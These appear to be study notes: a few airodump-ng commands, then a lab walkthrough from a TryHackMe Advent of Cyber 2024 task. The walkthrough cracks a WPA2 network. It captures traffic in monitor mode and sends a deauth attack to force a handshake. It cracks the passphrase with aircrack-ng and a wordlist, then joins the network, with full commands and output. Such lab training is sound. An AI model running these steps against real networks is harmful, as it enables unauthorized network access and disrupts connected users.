
airodump-ng wlan0mon -c 6 --bssid 00:00:00:00:ma:c0 -w filename

airodump-ng wlan0mon -b abg

5GHz
airodump-ng wlan0mon -b a

airodump-ng wlan0mon -b a -w savefile


### Examples

https://tryhackme.com/r/room/adventofcyber2024, task 17

```sh
glitch@wifi:~$ ls -la
total 32
drwxr-x--- 4 glitch glitch 4096 Nov  7 08:43 .
drwxr-xr-x 3 root   root   4096 Oct 29 21:49 ..
lrwxrwxrwx 1 root   root      9 Oct 29 04:17 .bash_history -> /dev/null
-rw-r--r-- 1 glitch glitch  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 glitch glitch 3772 Oct 29 21:58 .bashrc
drwx------ 2 glitch glitch 4096 Oct 29 01:14 .cache
-rw-r--r-- 1 glitch glitch  807 Jan  6  2022 .profile
-rw-r--r-- 1 root   root   4013 Oct 31 21:01 rockyou.txt
drwx------ 2 glitch glitch 4096 Oct 29 22:00 .ssh
-rw-r--r-- 1 glitch glitch    0 Oct 29 01:14 .sudo_as_admin_successful
-rw------- 1 glitch glitch    0 Oct 31 21:42 .viminfo
```

Get wifi interface info
```
glitch@wifi:~$ iw dev
phy#2
        Interface wlan2
                ifindex 5
                wdev 0x200000001
                addr 02:00:00:00:02:00
                type managed
                txpower 20.00 dBm
```

scan the wifi
```sh
glitch@wifi:~$ sudo iw dev wlan2 scan
BSS 02:00:00:00:00:00(on wlan2)
        last seen: 1125.652s [boottime]
        TSF: 1734008031351380 usec (20069d, 12:53:51)
        freq: 2437
        beacon interval: 100 TUs
        capability: ESS Privacy ShortSlotTime (0x0411)
        signal: -30.00 dBm
        last seen: 0 ms ago
        Information elements from Probe Response frame:
        SSID: MalwareM_AP
        Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
        DS Parameter set: channel 6
        ERP: Barker_Preamble_Mode
        Extended supported rates: 24.0 36.0 48.0 54.0 
        RSN:     * Version: 1
                 * Group cipher: CCMP
                 * Pairwise ciphers: CCMP
                 * Authentication suites: PSK
                 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
        Supported operating classes:
                 * current operating class: 81
        Extended capabilities:
                 * Extended Channel Switching
                 * Operating Mode Notification
```

Set wifi interface in monitor mode
```sh
glitch@wifi:~$ sudo ip link set dev wlan2 down

glitch@wifi:~$ sudo iw dev wlan2 set type monitor

glitch@wifi:~$ sudo iw dev wlan2 info
Interface wlan2
        ifindex 5
        wdev 0x200000001
        addr 02:00:00:00:02:00
        type monitor
        wiphy 2
        txpower 20.00 dBm
```

Listen what's on the network
```sh
glitch@wifi:~$ sudo airodump-ng wlan2

 CH  4 ][ Elapsed: 2 mins ][ 2024-12-12 13:06                                                                                 
                                                                                                                              
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                              
                                                                                                                              
 02:00:00:00:00:00  -28       96        1    0   6   54   WPA2 CCMP   PSK  MalwareM_AP                                        
                                                                                                                              
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                                            
                                                                                                                              
 02:00:00:00:00:00  02:00:00:00:01:00  -29    0 - 1      0        1                                                           
Quitting...
```

Listen to just one channel and access point (-c channel) and see if any clients are connected
```sh
glitch@wifi:~$ sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2                                           
13:07:06  Created capture file "output-file-01.cap".                                                                          

 CH  6 ][ Elapsed: 14 mins ][ 2024-12-12 13:21 ][ WPA handshake: 02:00:00:00:00:00                                            

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                          
 02:00:00:00:00:00  -28 100     8705       10    0   6   54   WPA2 CCMP   PSK  MalwareM_AP                                    
 
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                                            
 02:00:00:00:00:00  02:00:00:00:01:00  -29    1 - 1      0      167  EAPOL                                                    

Quitting...    
```

At the same time as logging, send a deauth attack ( -0 = attack type: deauth, 1 = number of attacks, -a access point, -c client )
```sh
glitch@wifi:~$ sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2
13:12:02  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 6                                                    
13:12:02  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
```

Check for log files
```sh
glitch@wifi:~$ ls -la
total 692
drwxr-x--- 4 glitch glitch   4096 Dec 12 13:07 .
drwxr-xr-x 3 root   root     4096 Oct 29 21:49 ..
lrwxrwxrwx 1 root   root        9 Oct 29 04:17 .bash_history -> /dev/null
-rw-r--r-- 1 glitch glitch    220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 glitch glitch   3772 Oct 29 21:58 .bashrc
drwx------ 2 glitch glitch   4096 Oct 29 01:14 .cache
-rw-r--r-- 1 root   root    13857 Dec 12 13:16 output-file-01.cap
-rw-r--r-- 1 root   root      481 Dec 12 13:16 output-file-01.csv
-rw-r--r-- 1 root   root      591 Dec 12 13:16 output-file-01.kismet.csv
-rw-r--r-- 1 root   root     2751 Dec 12 13:16 output-file-01.kismet.netxml
-rw-r--r-- 1 root   root   643072 Dec 12 13:16 output-file-01.log.csv
-rw-r--r-- 1 glitch glitch    807 Jan  6  2022 .profile
-rw-r--r-- 1 root   root     4013 Oct 31 21:01 rockyou.txt
drwx------ 2 glitch glitch   4096 Oct 29 22:00 .ssh
-rw-r--r-- 1 glitch glitch      0 Oct 29 01:14 .sudo_as_admin_successful
-rw------- 1 glitch glitch      0 Oct 31 21:42 .viminfo
```

Get the key
```sh
glitch@wifi:~$ sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap
Reading packets, please wait...
Opening output-file-01.cap
Read 295 packets.

1 potential targets

                               Aircrack-ng 1.6 

      [00:00:00] 8/513 keys tested (25.71 k/s) 
      Time left: 19 seconds                                      1.56%

      [00:00:00] 184/513 keys tested (394.97 k/s) 
      Time left: 0 seconds                                      35.87%

      [00:00:01] 320/513 keys tested (557.01 k/s) 
      Time left: 0 seconds                                      62.38%

      [00:00:01] 512/513 keys tested (699.65 k/s) 
      Time left: 0 seconds                                      99.81%

                       Current passphrase: amigos                     

      Master Key     : 58 22 9D 4C 54 9F 59 A8 1A C6 F6 BA 35 34 3C A9 
                        KEY FOUND! [ fluffy/champ24 ]

      Transient Key  : 0F 50 BD D3 68 75 BE DC 77 42 2D B1 D0 D7 05 8B 
                       EA 47 3A 86 50 A3 FE 6D DD 60 73 02 9D 30 BB 42 
                       3D 42 DE 09 23 D6 0E DB A5 E0 40 24 75 2F 49 C9 
      EAPOL HMAC     : 5F 57 66 92 24 E5 11 8A 0F 51 69 9A BA 9C E7 D4 
glitch@wifi:~$ 

```

Connect to the wifi
```sh
glitch@wifi:~$ wpa_passphrase MalwareM_AP 'fluffy/champ24' > config
glitch@wifi:~$ cat config                                                                                                     
network={
        ssid="MalwareM_AP"
        #psk="fluffy/champ24"
        psk=b6539a718cc4745fe326498237746509bec562ce43c468a7b48f8ce698ee1ccb
}
glitch@wifi:~$ sudo wpa_supplicant -B -c config -i wlan2
Successfully initialized wpa_supplicant
rfkill: Cannot get wiphy information
glitch@wifi:~$ iw dev
phy#2
        Unnamed/non-netdev interface
                wdev 0x200000002
                addr 42:00:00:00:02:00
                type P2P-device
                txpower 20.00 dBm
        Interface wlan2
                ifindex 5
                wdev 0x200000001
                addr 02:00:00:00:02:00
                ssid MalwareM_AP
                type managed
                channel 6 (2437 MHz), width: 20 MHz (no HT), center1: 2437 MHz
                txpower 20.00 dBm
```